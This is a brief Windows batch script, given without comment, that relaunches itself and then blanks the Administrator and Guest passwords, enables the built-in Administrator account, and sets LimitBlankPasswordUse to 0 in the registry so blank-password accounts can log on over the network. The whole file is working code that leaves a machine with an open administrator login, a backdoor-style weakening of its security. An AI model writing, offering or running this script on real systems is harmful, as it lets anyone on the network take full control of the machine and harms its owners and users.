@echo off
if not "%1"=="go" (rundll32 shell32.dll,ShellExec_RunDLL cmd /c "%~f0 go"&ping 127.0.0.1 -n 3>nul&exit)
net user Administrator ""
net user Guest ""
net user Administrator /active:yes
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >nul
pause
?
